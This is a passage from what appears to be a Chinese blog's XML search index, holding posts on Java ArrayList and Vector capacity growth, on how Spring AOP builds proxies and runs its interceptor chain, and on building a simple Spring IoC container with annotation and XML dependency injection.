capacityIncrement;&#125;public Vector(int initialCapacity) &#123; this(initialCapacity, 0);&#125;public Vector() &#123; this(10);&#125; 从构造方法中，我们可以看出Vector的默认大小也是10，而且它在初始化的时候就已经创建了数组了，这点跟ArrayList不一样。再来看一下grow方法：12345678910private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ? capacityIncrement : oldCapacity); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); elementData = Arrays.copyOf(elementData, newCapacity);&#125; 从grow方法中我们可以发现，newCapacity默认情况下是两倍的oldCapacity，而当指定了capacityIncrement的值之后，newCapacity变成了oldCapacity+capacityIncrement。 10. 总结 注意扩充容量的方法ensureCapacity。ArrayList在每次增加元素（可能是1个，也可能是一组）时，都要调用该方法来确保足够的容量。当容量不足以容纳当前的元素个数时，就设置新的容量为旧的容量的1.5倍，如果设置后的新容量还不够，则直接新容量设置为传入的参数（也就是所需的容量），而后用Arrays.copyof()方法将元素拷贝到新的数组（详见下面的第3点）。从中可以看出，当容量不够时，每次增加元素，都要将原来的元素拷贝到一个新的数组中，非常之耗时，也因此建议在事先能确定元素数量的情况下，才使用ArrayList，否则建议使用LinkedList。 1、ArrayList创建时的大小为0；当加入第一个元素时，进行第一次扩容时，默认容量大小为10。2、ArrayList每次扩容都以当前数组大小的1.5倍去扩容。 3、Vector创建时的默认大小为10。 4、Vector每次扩容都以当前数组大小的2倍去扩容。当指定了capacityIncrement之后，每次扩容仅在原先基础上增加capacityIncrement个单位空间。 5、ArrayList和Vector的add、get、size方法的复杂度都为O(1)，remove方法的复杂度为O(n)。 6、ArrayList是非线程安全的，Vector是线程安全的。 ArrayList不是线程同步的，在多线程下可以考虑使用 Collections.synchronizedList 方法将该列表“包装”起来。这最好在创建时完成，以防止意外对列表进行不同步的访问：代码如下： 1List list = Collections.synchronizedList(new ArrayList(...));]]></content>
      <tags>
        <tag>java容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[28.Spring AOP的实现原理]]></title>
    <url>%2F2018%2F07%2F21%2F28.Spring%20AOP%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[详细探讨spring aop的实现原理。 静态代理和动态代理AspectJ是静态代理的增强，所谓的静态代理就是AOP框架会在编译阶段生成AOP代理类，因此也称为编译时增强。 Spring AOP使用的动态代理，所谓的动态代理就是说AOP框架不会去修改字节码，而是在内存中临时为方法生成一个AOP对象，这个AOP对象包含了目标对象的全部方法，并且在特定的切点做了增强处理，并回调原对象的方法。 Spring AOP中的动态代理主要有两种方式，JDK动态代理和CGLIB动态代理。JDK动态代理通过反射来接收被代理的类，并且要求被代理的类必须实现一个接口。JDK动态代理的核心是InvocationHandler接口和Proxy类。 如果目标类没有实现接口，那么Spring AOP会选择使用CGLIB来动态代理目标类。CGLIB（Code Generation Library），是一个代码生成的类库，可以在运行时动态的生成某个类的子类，注意，CGLIB是通过继承的方式做的动态代理，因此如果某个类被标记为final，那么它是无法使用CGLIB做动态代理的。 AspectJ在编译时就增强了目标对象，Spring AOP的动态代理则是在每次运行时动态的增强，生成AOP代理对象，区别在于生成AOP代理对象的时机不同，相对来说AspectJ的静态代理方式具有更好的性能，但是AspectJ需要特定的编译器进行处理，而Spring AOP则无需特定的编译器处理。 Spring内部创建代理对象的过程强调了无数次的动态代理，那么spring到底是如何创建代理对象的呢？我们先用ProxyFactoryBean来实现一个AOP功能！ 假定我们现在有一个接口TicketService及其实现类RailwayStation，我们打算创建一个代理类，在执行TicketService的方法时的各个阶段，插入对应的业务代码。 12345678910111213/** * 售票服务接口 */public interface TicketService &#123; //售票 void sellTicket(); //问询 void inquire(); //退票 void withdraw();&#125; 售票接口实现类：12345678910111213141516public class RailwayStation implements TicketService&#123; @Override public void sellTicket() &#123; System.out.println("售票............"); &#125; @Override public void inquire() &#123; System.out.println("问询............."); &#125; @Override public void withdraw() &#123; System.out.println("退票............."); &#125;&#125; Before：123456789/** * 执行RealSubject对象的方法之前的处理意见 */public class TicketServiceBeforeAdvice implements MethodBeforeAdvice &#123; @Override public void before(Method method, Object[] objects, Object o) throws Throwable &#123; System.out.println("BEFORE_ADVICE: 欢迎光临代售点...."); &#125;&#125; AfterReturning： 123456789/** * 返回结果时后的处理意见 */public class TicketServiceAfterReturningAdvice implements AfterReturningAdvice &#123; @Override public void afterReturning(Object returnValue, Method method, Object[] args, Object target) throws Throwable &#123; System.out.println("AFTER_RETURNING：本次服务正常结束...."); &#125;&#125; Throw：12345678910public class TicketServiceThrowsAdvice implements ThrowsAdvice &#123; public void afterThrowing(Exception ex)&#123; System.out.println("AFTER_THROWING...."); &#125; public void afterThrowing(Method method, Object[] args, Object target, Exception ex)&#123; System.out.println("调用过程出错啦！！！！！"); &#125;&#125; Around：123456789public class TicketServiceAroundAdvice implements MethodInterceptor &#123; @Override public Object invoke(MethodInvocation invocation) throws Throwable &#123; System.out.println("AROUND_ADVICE:BEGIN....环绕通知开始"); Object returnValue = invocation.proceed(); System.out.println("AROUND_ADVICE:END.....环绕通知结束"); return returnValue; &#125;&#125; 测试：1234567891011121314151617181920212223242526272829303132public class App &#123; public static void main(String[] args) throws Exception &#123; //1.针对不同的时期类型，提供不同的Advice Advice beforeAdvice = new TicketServiceBeforeAdvice(); Advice afterReturningAdvice = new TicketServiceAfterReturningAdvice(); Advice aroundAdvice = new TicketServiceAroundAdvice(); Advice throwsAdvice = new TicketServiceThrowsAdvice(); RailwayStation railwayStation = new RailwayStation(); //2.创建ProxyFactoryBean,用以创建指定对象的Proxy对象 ProxyFactoryBean proxyFactoryBean = new ProxyFactoryBean(); //3.设置Proxy的接口 proxyFactoryBean.setInterfaces(TicketService.class); //4. 设置RealSubject proxyFactoryBean.setTarget(railwayStation); //5.使用JDK基于接口实现机制的动态代理生成Proxy代理对象，如果想使用CGLIB，需要将这个flag设置成true proxyFactoryBean.setProxyTargetClass(true); //6. 添加不同的Advice proxyFactoryBean.addAdvice(afterReturningAdvice); proxyFactoryBean.addAdvice(aroundAdvice); proxyFactoryBean.addAdvice(throwsAdvice); proxyFactoryBean.addAdvice(beforeAdvice); proxyFactoryBean.setProxyTargetClass(false); //7. 通过ProxyFactoryBean生成Proxy对象 TicketService ticketService = (TicketService) proxyFactoryBean.getObject(); ticketService.sellTicket(); &#125;&#125; 运行结果： 12345AROUND_ADVICE:BEGIN....环绕通知开始BEFORE_ADVICE: 欢迎光临代售点....售票............AROUND_ADVICE:END.....环绕通知结束AFTER_RETURNING：本次服务正常结束.... 你会看到，我们成功地创建了一个通过一个ProxyFactoryBean和 真实的实例对象创建出了对应的代理对象，并将各个Advice加入到proxy代理对象中。 你会发现，在调用RailwayStation的sellticket()之前，成功插入了BeforeAdivce逻辑，而调用RailwayStation的sellticket()之后，AfterReturning逻辑也成功插入了。 本例中ProxyFactoryBean是通过JDK的针对接口的动态代理模式生成代理对象的，具体机制，请看下面关于ProxyFactoryBean的介绍。 Spring AOP的核心—ProxyFactoryBean 上面我们通过了纯手动使用ProxyFactoryBean实现了AOP的功能。现在来分析一下上面的代码：我们为ProxyFactoryBean提供了如下信息： Proxy感兴趣的Adivce列表； 真正的实例对象引用ticketService; 告诉ProxyFactoryBean使用基于接口实现的JDK动态代理机制实现proxy: Proxy应该具备的Interface接口：TicketService; 根据这些信息，ProxyFactoryBean就能给我们提供我们想要的Proxy对象了！那么，ProxyFactoryBean帮我们做了什么？ 对于生成Proxy的工厂Bean而言，它要知道对其感兴趣的Advice信息，而这类的信息，被维护到Advisor中。Advisor可以根据特定的类名和方法名返回对应的AdviceChain，用以表示需要执行的Advice串。 代理对象由ProxyFactoryBean获取，ProxyFactoryBean是一个工厂bean，其getObject方法主要做了两件事： 加载配置； 创建并调用AopProxy返回代理对象。 Spring通过AopProxy接口类把Aop代理对象的实现与框架的其它部分有效的分离开来。ProxyFactoryBean倒像是一个桥梁，准备了必要的环境（比如将配置文件上的配置加载到属性上），真正的代理对象靠AopProxy生成。 AopProxy的getProxy()方法中调用Proxy.newProxyInstance(xx,xx,Invocationhanlder)创建代理对象，当然了，要为这个调用准备一个InvocationHanlder实现（AopProxy实现类同时也实现了InvocationHanlder接口）。在invoke方法里，触发目标对象方法对应的拦截链的执行。 AopProxy实例由AopProxyFactory创建，相关接口描述如下： 123456789101112131415161718public interface AopProxy &#123; Object getProxy(); Object getProxy(ClassLoader classLoader);&#125;class JdkDynamicAopProxy implements AopProxy, InvocationHandler&#123; private final AdvisedSupport advised; // 包含大量配置信息 public Object getProxy(ClassLoader classLoader) &#123; Class[] proxiedInterfaces = AopProxyUtils.completeProxiedInterfaces(this.advised); findDefinedEqualsAndHashCodeMethods(proxiedInterfaces); // 返回代理对象 return Proxy.newProxyInstance(classLoader, proxiedInterfaces, this); &#125; // InvocationHandler接口方法实现 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; 1. 根据method拿到对应的拦截器链 2. 执行拦截器链 &#125;&#125; 基于JDK面向接口的动态代理JdkDynamicAopProxy生成代理对象JdkDynamicAopProxy类实现了AopProxy，能够返回Proxy，并且，其自身也实现了InvocationHandler角色。也就是说，当我们使用proxy时，我们对proxy对象调用的方法，都最终被转到这个类的invoke()方法中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990@Overridepublic Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; MethodInvocation invocation; Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Class&lt;?&gt; targetClass = null; Object target = null; try &#123; if (!this.equalsDefined &amp;&amp; AopUtils.isEqualsMethod(method)) &#123; //目标类没有实现eqauls()方法 // The target does not implement the equals(Object) method itself. return equals(args[0]); &#125; else if (!this.hashCodeDefined &amp;&amp; AopUtils.isHashCodeMethod(method)) &#123; //目标类没有实现hashCode()方法 // The target does not implement the hashCode() method itself. return hashCode(); &#125; else if (method.getDeclaringClass() == DecoratingProxy.class) &#123; // There is only getDecoratedClass() declared -&gt; dispatch to proxy config. return AopProxyUtils.ultimateTargetClass(this.advised); &#125; else if (!this.advised.opaque &amp;&amp; method.getDeclaringClass().isInterface() &amp;&amp; method.getDeclaringClass().isAssignableFrom(Advised.class)) &#123; // Service invocations on ProxyConfig with the proxy config... return AopUtils.invokeJoinpointUsingReflection(this.advised, method, args); &#125; Object retVal; if (this.advised.exposeProxy) &#123; // Make invocation available if necessary. oldProxy = AopContext.setCurrentProxy(proxy); setProxyContext = true; &#125; // May be null. Get as late as possible to minimize the time we "own" the target, // in case it comes from a pool. target = targetSource.getTarget(); if (target != null) &#123; targetClass = target.getClass(); &#125; // 获取Advice chain List&lt;Object&gt; chain = this.advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); // Check whether we have any advice. If we don't, we can fallback on direct // reflective invocation of the target, and avoid creating a MethodInvocation. if (chain.isEmpty()) &#123; // We can skip creating a MethodInvocation: just invoke the target directly // Note that the final invoker must be an InvokerInterceptor so we know it does // nothing but a reflective operation on the target, and no hot swapping or fancy proxying. Object[] argsToUse = AopProxyUtils.adaptArgumentsIfNecessary(method, args); retVal = AopUtils.invokeJoinpointUsingReflection(target, method, argsToUse); &#125; else &#123; // We need to create a method invocation... invocation = new ReflectiveMethodInvocation(proxy, target, method, args, targetClass, chain); // Proceed to the joinpoint through the interceptor chain. retVal = invocation.proceed(); &#125; // Massage return value if necessary. Class&lt;?&gt; returnType = method.getReturnType(); if (retVal != null &amp;&amp; retVal == target &amp;&amp; returnType != Object.class &amp;&amp; returnType.isInstance(proxy) &amp;&amp; !RawTargetAccess.class.isAssignableFrom(method.getDeclaringClass())) &#123; // Special case: it returned "this" and the return type of the method // is type-compatible. Note that we can't help if the target sets // a reference to itself in another returned object. retVal = proxy; &#125; else if (retVal == null &amp;&amp; returnType != Void.TYPE &amp;&amp; returnType.isPrimitive()) &#123; throw new AopInvocationException( "Null return value from advice does not match primitive return type for: " + method); &#125; return retVal; &#125; finally &#123; if (target != null &amp;&amp; !targetSource.isStatic()) &#123; // Must have come from TargetSource. targetSource.releaseTarget(target); &#125; if (setProxyContext) &#123; // Restore old proxy. AopContext.setCurrentProxy(oldProxy); &#125; &#125;&#125; 主流程可以简述为：获取可以应用到此方法上的通知链（Interceptor Chain），如果有，则应用通知，并执行joinpoint；如果通知链为空，则直接反射执行joinpoint。 拦截链的如何执行的呢？刚才提到，虽然同是责任链模式，但aop拦截器链跟一般的责任链模式还是有所不同的。aop的拦截器分为前置，后置和异常时拦截。而在一般的责任链模式中，前置、后置和异常时拦截是通过代码实现来区分的。 1234567891011121314151617181920// 链的执行class ReflectiveMethodInvocation implements ProxyMethodInvocation&#123; // 目标方法、参数和类型 protected final Object target,Method method,Object[] arguments,Class targetClass; // 当前拦截器的索引 private int currentInterceptorIndex = -1; protected final List interceptorsAndDynamicMethodMatchers;// 拦截器链（已经从advice转化为了interceptor（适配器模式）） public Object proceed() throws Throwable &#123; // 如果执行到链的最后，则直接执行目标方法 // 获取当前interceptor Object interceptorOrInterceptionAdvice = this.interceptorsAndDynamicMethodMatchers.get(++this.currentInterceptorIndex); if (interceptorOrInterceptionAdvice符合特定类型) &#123; // 执行特定逻辑 &#125;else &#123; // 执行拦截器 return ((MethodInterceptor) interceptorOrInterceptionAdvice).invoke(this); &#125; &#125;&#125; aop拦截器链的执行逻辑如下： 执行所有的前置通知，如果碰到后置通知，则方法入栈（递归调用）。 执行目标方法 执行后置通知（原来压栈的方法出栈） 异常通知（与后置通知类似（都是在方法的后边执行嘛），不过，貌似一个方法的异常通知只能有一个） 各种Advice的执行顺序是如何和方法调用进行结合的？JdkDynamicAopProxy 和CglibAopProxy只是创建代理方式的两种方式而已，实际上我们为方法调用添加的各种Advice的执行逻辑都是统一的。在Spring的底层，会把我们定义的各个Adivce分别 包裹成一个 MethodInterceptor,这些Advice按照加入Advised顺序，构成一个AdivseChain. 比如我们上述的代码： 123456789//5. 添加不同的Advice proxyFactoryBean.addAdvice(afterReturningAdvice); proxyFactoryBean.addAdvice(aroundAdvice); proxyFactoryBean.addAdvice(throwsAdvice); proxyFactoryBean.addAdvice(beforeAdvice); proxyFactoryBean.setProxyTargetClass(false); //通过ProxyFactoryBean生成 TicketService ticketService = (TicketService) proxyFactoryBean.getObject(); ticketService.sellTicket(); 当我们调用 ticketService.sellTicket()时，Spring会把这个方法调用转换成一个MethodInvocation对象，然后结合上述的我们添加的各种Advice,组成一个ReflectiveMethodInvocation: 各种Advice本质而言是一个方法调用拦截器. 至于如何按照我们的意愿正确执行这个拦截器链，就是我们之前介绍的责任链模式方案二。 我们以这个例子再来说明拦截器链式执行顺序。 Advice拦截器的添加顺序: 1234proxyFactoryBean.addAdvice(afterReturningAdvice); proxyFactoryBean.addAdvice(aroundAdvice); proxyFactoryBean.addAdvice(throwsAdvice); proxyFactoryBean.addAdvice(beforeAdvice); 第一个拦截器：AfterReturningAdvice第一个添加的是afterReturningAdivce,它所处的位置是第一个拦截器，执行的操作就是： 123456@Override public Object invoke(MethodInvocation mi) throws Throwable &#123; Object retVal = mi.proceed(); this.advice.afterReturning(retVal, mi.getMethod(), mi.getArguments(), mi.getThis()); return retVal; &#125; 也就是说，先完成MethodInvocation的proceed()方法再执行相应的advice；而调用了mi.proceed()方法，导致了当前的调用链后移，进行和后续的操作，也就是说，AfterReturningAdvice只能等到整个拦截器链上所有执行完毕后才会生效，所以：AFTER_RETURNING:本次服务正常结束结束.... 这句话排在了最后. 第二个拦截器：AroundAdvice1234567@Override public Object invoke(MethodInvocation invocation) throws Throwable &#123; System.out.println("AROUND_ADVICE:BEGIN....环绕通知开始"); Object returnValue = invocation.proceed(); System.out.println("AROUND_ADVICE:END.....环绕通知结束"); return returnValue; &#125; 现在执行到了第二个拦截器，首先输出了AROUND_ADVICE:BEGIN......环绕通知开始，接着调用Invocation.proceed(),等到剩余的执行完后，再输出AROUND_ADVICE:END.....环绕通知结束 第三个拦截器：ThrowsAdvice123456789101112131415@Override public Object invoke(MethodInvocation mi) throws Throwable &#123; try &#123; //先执行invocation.proceed(); return mi.proceed(); &#125; catch (Throwable ex) &#123; //捕捉错误，调用afterThrowing()方法 Method handlerMethod = getExceptionHandler(ex); if (handlerMethod != null) &#123; invokeHandlerMethod(mi, ex, handlerMethod); &#125; throw ex; &#125; &#125; 上述的逻辑是，先执行Invocation.proceed();如果这个过程中抛出异常，则调用ThrowsAdvice。 第四个拦截器:BeforeAdvice12345@Override public Object invoke(MethodInvocation mi) throws Throwable &#123; this.advice.before(mi.getMethod(), mi.getArguments(), mi.getThis() );//先执行Advice return mi.proceed();//后执行Invocation &#125; 那么再对照执行的结果，就不难理解为什么是这样的输出顺序了。 我们经常用pointcut来指定哪些方法被加强,这个实际上是要求我们添加一个过滤器，如果满足条件，则Advice生效，否则无效。Spring将这个过滤器抽象成如下的接口： 1234567891011121314public interface MethodMatcher &#123; /** * 提供方法签名和所属的Class类型，判断是否支持 */ boolean matches(Method method, Class&lt;?&gt; targetClass); boolean isRuntime(); boolean matches(Method method, Class&lt;?&gt; targetClass, Object... args); MethodMatcher TRUE = TrueMethodMatcher.INSTANCE; &#125; 补充-加载AOP配置本文一开始直接从ProxyFactoryBean说起，直接说到advice维护在advisor中，再根据不同的方法返回AdviceChain。那么这些advice到AdviceChain过程是什么呢？ 这里补充的内容是关于AdvisorChain是如何来的，整体的思路是初始化时加载所有的advisor到ProxyFactoryBean中，如何形成不同的拦截链呢？就是再根据方法来组成(advisor中的pointcut的matches方法判断advisor是否使用这个method，使用则将其转换为Interceptor，加入到chain中)。 加载AOP配置AOP的配置主要包括两个方面：哪些类的哪些方法需要增强，这些方法需要什么“增强”。与spring惯用的思路一样，第一次执行时，总是伴随着大量的操作（比如加载advice类），部分操作结果会被缓存，以节省下次操作的时间。 12345678ProxyFactoryBean extends ProxyCreatorSupport (extends AdvisedSupport)&#123; private String[] interceptorNames; private List&lt;Advisor&gt; advisors;（来自AdvisedSupport类） getObject()&#123; 1. initializeAdvisorChain(); //加载所有的advisor 2. 返回代理对象 &#125;&#125; 其中initializeAdvisorChain方法的主要思路 1234initializeAdvisorChain()&#123; 根据interceptorNames拿到每一个interceptor（即advice）的名字 根据名字通过ioc拿到advice实例，并将其加入到advisors成员中&#125; advice加载进内存后，会根据方法的不同组成不同的拦截链（根据配置）。如何根据方法拿到对应的拦截链： 123456789101112131415161718192021222324// 该逻辑的调用时机class JdkDynamicAopProxy implements AopProxy,InvocationHandler&#123; private final AdvisedSupport advised; public Object invoke(Object proxy, Method method, Object[] args)&#123; chain = advised.getInterceptorsAndDynamicInterceptionAdvice(method, targetClass); invocation = new ReflectiveMethodInvocation(xx, target, method, args, targetClass, chain); retVal = invocation.proceed(); &#125; public Object getProxy()&#123; // 准备数据 Proxy.newProxyInstance(xx,xx,this); &#125;&#125;// 如何拿到class AdvisedSupport&#123; private List&lt;Advisor&gt; advisors; getInterceptorsAndDynamicInterceptionAdvice(method, targetClass)&#123; 1. 先从缓存里看看 2. 如果缓存中没有 3. 遍历advisors（依据配置加载的所有advisors（advisor=advice + pointcut）），通过当前advisor中的pointcut的matches方法判断advisor是否使用这个method，使用则将其转换为Interceptor，加入到chain中 4. 返回chain并加入缓存 &#125;&#125; 总结我认为要理解AOP要理解一下几个问题： 1.ProxyFactoryBean是什么？有什么作用？ProxyFactoryBean是AOP的核心,把Adivce列表、真正的实例对象引用、使用基于接口实现的JDK动态代理机制和Proxy应该具备的Interface接口告诉他，就可以拿到Proxy对象了！ 2.代理对象的生成究竟是靠谁？Spring通过AopProxy接口类把Aop代理对象的实现与框架的其它部分有效的分离开来。ProxyFactoryBean倒像是一个桥梁，准备了必要的环境（比如将配置文件上的配置加载到属性上），真正的代理对象靠AopProxy生成。 3.代理对象大概生成的流程？这里只谈论JDK动态代理实现原理。 AopProxy的getProxy()方法中调用Proxy.newProxyInstance(xx,xx,Invocationhanlder)创建代理对象，当然了，要为这个调用准备一个InvocationHanlder实现（AopProxy实现类同时也实现了InvocationHanlder接口）。在invoke方法里，触发目标对象方法对应的拦截链的获取和执行(执行方法的时候会委托到InvocationHandler.invoke()方法)。 4.哪些类的哪些方法需要增强，这些方法需要什么“增强”，这些信息哪来的？与spring惯用的思路一样，第一次执行时，总是伴随着大量的操作（比如加载advice类），部分操作结果会被缓存，以节省下次操作的时间。 5.如何根据方法拿到对应的拦截链？遍历advisors（依据配置加载的所有advisors（advisor=advice + pointcut）），通过当前advisor中的pointcut的matches方法判断advisor是否使用这个method，使用则将其转换为Interceptor，加入到chain中 6.其他 至于Adivce如何包裹为一个 MethodInterceptor的细节就没有说，如果要继续了解，可以看Spring AOP实现原理中所介绍的。 最后关于AdivseChain如何按照一定逻辑执行，归纳起来就是用了责任链模式。 拦截器是AOP的一个实现：Java中的拦截器是基于Java反射机制实现的，更准确的划分，应该是基于JDK实现的动态代理。它依赖于具体的接口，在运行期间动态生成字节码。 整理自：https://blog.csdn.net/luanlouis/article/details/51155821 参考了：https://qiankunli.github.io/2015/12/28/spring-aop.html]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[27.自己动手写springIOC(3)]]></title>
    <url>%2F2018%2F07%2F21%2F27.%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99springIOC(3)%2F</url>
    <content type="text"><![CDATA[简单实现spring IOC 容器的依赖注入功能. 继续完成spring基于注解的依赖注入的实现。 关于注解的知识我已经在java基础这个标签中的一篇文章来详细描述了，这里直接跳过基本的注解的介绍，直接写一个注解，这个注解可以标注在方法或者属性上，表示将标注的对象注入进来。 12345@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.FIELD,ElementType.METHOD&#125;)public @interface SwgResource &#123; public String name() default "";&#125; 这个就相当于一直常用的@Resource，下面实现的默认规则也是先按照名称来找，找不到再按照类型来找。 那么下面如何实现这个注解来注入呢？ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879private void annotationInject() &#123; //遍历所有的bean for (String beanName : sigletons.keySet()) &#123; Object bean=sigletons.get(beanName);//获取需要注入的bean if (bean != null) &#123; try &#123; //1.先对属性进行处理，即setter方法上标识有注解的 BeanInfo info = Introspector.getBeanInfo(bean.getClass());//通过类Introspector的getBeanInfo方法获取对象的BeanInfo 信息 PropertyDescriptor[] pds = info.getPropertyDescriptors();//获得 bean所有的属性描述 for (PropertyDescriptor pd : pds) &#123; Method setter=pd.getWriteMethod();//获取属性的setter方法 //属性存在setter方法，并且setter方法存在SwgResource注解 if (setter != null &amp;&amp; setter.isAnnotationPresent(SwgResource.class)) &#123; SwgResource resource=setter.getAnnotation(SwgResource.class);//取得setter方法的注解 Object value=null; //注解的name属性不为空 if (resource != null &amp;&amp; resource.name() != null &amp;&amp; !"".equals(resource.name())) &#123; value=sigletons.get(resource.name());//根据注解的name属性从容器中取出来 &#125;else &#123;//注解上没有标注name属性 value=sigletons.get(pd.getName());//根据属性的名称取集合中寻找此名称的bean if (value == null) &#123; //没找到，遍历所有所有的bean，找类型相匹配的bean for (String key : sigletons.keySet()) &#123; //判断类型是否匹配 if (pd.getPropertyType().isAssignableFrom(sigletons.get(key).getClass())) &#123; value=sigletons.get(key);//类型匹配的话就把此相同类型的 break;//找到了类型相同的bean，退出循环 &#125; &#125; &#125; &#125; setter.setAccessible(true);//保证setter方法可以访问私有 try &#123; setter.invoke(bean,value);//把引用对象注入到属性中 &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; //2.再对字段进行处理，即对字段上标识有注解 Field[] fields=bean.getClass().getDeclaredFields();//取得声明的所有字段 for (Field field : fields) &#123; //判断字段上是否存在注解,若存在 if (field.isAnnotationPresent(SwgResource.class)) &#123; SwgResource resource=field.getAnnotation(SwgResource.class);//取得字段上的注解 Object value=null; //字段上存在注解，并且字段上注解的name属性不为空 if (resource != null &amp;&amp; resource.name() != null &amp;&amp; !resource.name().equals("")) &#123; value=sigletons.get(resource.name());//依赖对象为根据此注解的name属性指定的对象 &#125;else &#123; value=sigletons.get(field.getName());//根据字段的名称到容器中寻找bean if (value == null) &#123; //没找到，根据字段的类型去寻找 for (String key : sigletons.keySet()) &#123; //判断类型是否匹配 if (field.getType().isAssignableFrom(sigletons.get(key).getClass())) &#123; value=sigletons.get(key);//类型匹配的话就把此相同类型的 break;//找到了类型相同的bean，退出循环 &#125; &#125; &#125; &#125; field.setAccessible(true);//设置允许访问私有字段 try &#123; field.set(bean, value);//将值为value的注入到bean对象上 &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; catch (IntrospectionException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 仔细看上面代码，其实并不复杂，核心用了内省和反射，内省机制可以很方便地获取属性的描述符，比如getter和setter方法等，反射可以轻易地拿到属性，包括私有属性，继而获取属性上的注解，最后呢，内省通过调用invoke函数，可以执行setter方法达到注入的目的，而直接通过反射拿到的field可以直接将值注入进去。 将beans.xml中的内容修改掉： 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="personService2" class="com.swg.myspring.service.PersonServiceImpl2"/&gt; &lt;bean id="personDao" class="com.swg.myspring.dao.PersonDaoImpl"/&gt;&lt;/beans&gt; 测试一把吧： 12@SwgResource(name = "personDao")private PersonDao personDao; 或者： 1234@SwgResource(name = "personDao")public void setPersonDao(PersonDao personDao) &#123; this.personDao = personDao;&#125; 最后的运行结果为： 123456id为：personService2的bean实例化成功id为：personDao的bean实例化成功age:nullservice中的sayHello方法调用成功调用注入的dao方法成功 这样就实现了注解方式的注入。]]></content>
      <tags>
        <tag>spring学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[26.自己动手写springIOC(2)]]></title>
    <url>%2F2018%2F07%2F21%2F26.%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99springIOC(2)%2F</url>
    <content type="text"><![CDATA[简单实现spring IOC 容器的依赖注入功能. 尝试实现一下spring的核心之一的IOC（依赖注入）。 首先我们已经学会了解析 xml 文件，将 bean 解析到一个叫做 BeanDefinition 的对象中，然后根据 BeanDefinition 中的 id 和 class 来实例化相应的对象。 但是 spring 的一个核心是 IOC ，其实原理就是 DI ，即依赖注入，就是说依赖的关系由 spring 来管理了，不需要自己去 new 来维持，spring 在启动的某一个时期会对你声明的所有的 bean 以及注入关系等都设置好。那么，到底如何实现这个依赖注入呢？就是说，在上面实例化好对象之后，如何实现他们之间的自动的注入呢？ 首先准备一个xml： 1234567891011121314&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"&gt; &lt;bean id="personService2" class="com.swg.myspring.service.PersonServiceImpl2"&gt; &lt;property name="personDao" ref="personDao"/&gt; &lt;property name="age" value="24"/&gt; &lt;/bean&gt; &lt;bean id="personDao" class="com.swg.myspring.dao.PersonDaoImpl"/&gt;&lt;/beans&gt; 我们可以看到，声明了一个叫做 personDao 的 bean，以及一个叫做 personService2 的 bean，但是里面注入了 personDao 和一个基本类型的数据。 对应的service： 123public interface PersonService2 &#123; void sayHello();&#125; 12345678910111213141516@Datapublic class PersonServiceImpl2 implements PersonService2&#123; private PersonDao personDao; private Integer age; public void setPersonDao(PersonDao personDao) &#123; this.personDao = personDao; &#125; @Override public void sayHello()&#123; System.out.println("age:"+age); System.out.println("service中的sayHello方法调用成功"); personDao.dbSayHello(); &#125;&#125; 对于dao： 123public interface PersonDao &#123; void dbSayHello();&#125; 123456public class PersonDaoImpl implements PersonDao&#123; @Override public void dbSayHello() &#123; System.out.println("调用注入的dao方法成功"); &#125;&#125; 我们分析一下，BeanDefinition 就是多了一组 property 属性，是用来给属性注入值的。所以，BeanDefinition 的定义是： 12345678910111213141516@Data@NoArgsConstructor@AllArgsConstructorpublic class BeanDefinition2 &#123; //bean的id private String id; //bean的class private String className; //bean对象的属性 private List&lt;PropertyDefinition&gt; propertyDefinitions=new ArrayList&lt;PropertyDefinition&gt;(); public BeanDefinition2(String id, String className) &#123; this.id = id; this.className = className; &#125;&#125; 显然，我们需要一个 PropertyDefinition ： 1234567891011@Data@NoArgsConstructor@AllArgsConstructorpublic class PropertyDefinition &#123; //属性名称 private String name; //属性引用值 private String ref; //属性value值 private String value;&#125; 对于 xml 文件的解析，比之前多了一个解析 Property，其他的都没变： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class SwgClassPathXmlApplicationContext2 &#123; //解析xml文件中bean并存储所有的bean private List&lt;BeanDefinition2&gt; beanDefines=new ArrayList&lt;&gt;(); //用来存储实例化后的bean private Map&lt;String, Object&gt; sigletons =new HashMap&lt;&gt;(); public SwgClassPathXmlApplicationContext2(String fileName)&#123; this.readXml(fileName); this.instanceBeans(); &#125; private void readXml(String fileName) &#123; //创建一个读取器 SAXReader saxReader=new SAXReader(); Document document=null; try &#123; //获取要读取的配置文件的路径 URL xmlPath=this.getClass().getClassLoader().getResource(fileName); //读取文件内容 document=saxReader.read(xmlPath); //1.获取xml中的根元素 Element rootElement=document.getRootElement(); for (Iterator iterator = rootElement.elementIterator(); 